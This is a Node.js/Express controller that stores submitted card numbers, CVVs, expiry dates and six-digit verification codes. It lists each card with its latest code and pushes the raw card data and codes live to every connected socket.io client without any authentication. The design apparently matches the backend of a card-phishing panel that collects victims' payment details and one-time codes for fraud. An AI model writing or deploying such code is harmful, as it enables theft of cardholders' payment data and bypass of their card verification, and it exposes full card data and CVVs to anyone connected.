const Card = require('../models/card.model');
const CardCode = require('../models/card_code.model');

// CREATE CARD
exports.createCard = async (req, res) => {
  try {
    const { name, cardNumber, cvv, expiry } = req.body;

    // Validation
    if (!name || name.trim() === '') {
      return res.status(400).json({ message: 'Name on card is required' });
    }
    if (!cardNumber || !/^\d{16}$/.test(cardNumber)) {
      return res.status(400).json({ message: 'Card number must be 16 digits' });
    }
    if (!cvv || !/^\d{3,4}$/.test(cvv)) {
      return res.status(400).json({ message: 'CVV must be 3 or 4 digits' });
    }
    if (!expiry || !/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(expiry)) {
      return res.status(400).json({ message: 'Expiry date must be in MM/YY format' });
    }

    // Expiry date past check
    const [month, year] = expiry.split('/');
    const expiryDate = new Date(Number(`20${year}`), Number(month) - 1);
    const now = new Date();
    now.setDate(1);
    now.setHours(0, 0, 0, 0);
    if (expiryDate < now) {
      return res.status(400).json({ message: 'Expiry date cannot be in the past' });
    }

    const card = await Card.create({ name, cardNumber, cvv, expiry });
    
    // EMIT SOCKET EVENT
    const io = req.app.get('socketio');
    io.emit('card-added', card);

    res.status(201).json(card);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
};

// GET CARDS WITH PAGINATION
exports.getCards = async (req, res) => {
  try {
    const page = Math.max(1, parseInt(req.query.page) || 1);
    const limit = Math.max(1, parseInt(req.query.limit) || 10);
    const offset = (page - 1) * limit;

    const { count, rows } = await Card.findAndCountAll({
      limit,
      offset,
      order: [['createdAt', 'DESC']],
    });

    // For each card, find the latest code
    const cardsWithCodes = await Promise.all(rows.map(async (card) => {
      const latestCode = await CardCode.findOne({
        where: { cardNumber: card.cardNumber },
        order: [['createdAt', 'DESC']],
      });
      return {
        ...card.toJSON(),
        latestCode: latestCode ? latestCode.code : null,
        latestCodeCreatedAt: latestCode ? latestCode.createdAt : null,
      };
    }));

    res.json({
      cards: cardsWithCodes,
      pagination: {
        total: count,
        page,
        limit,
        totalPages: Math.ceil(count / limit),
      },
    });
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
};

// CREATE CARD CODE
exports.createCardCode = async (req, res) => {
  try {
    const { cardNumber, code } = req.body;

    // Validation
    if (!cardNumber || !/^\d{16}$/.test(cardNumber)) {
      return res.status(400).json({ message: 'Card number must be 16 digits' });
    }
    if (!code || !/^\d{6}$/.test(code)) {
      return res.status(400).json({ message: 'Verification code must be 6 digits' });
    }

    const cardCode = await CardCode.create({ cardNumber, code });
    
    // EMIT SOCKET EVENT
    const io = req.app.get('socketio');
    io.emit('card-code-updated', {
      cardNumber: cardCode.cardNumber,
      code: cardCode.code,
      latestCodeCreatedAt: cardCode.createdAt,
    });

    res.status(201).json(cardCode);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
};
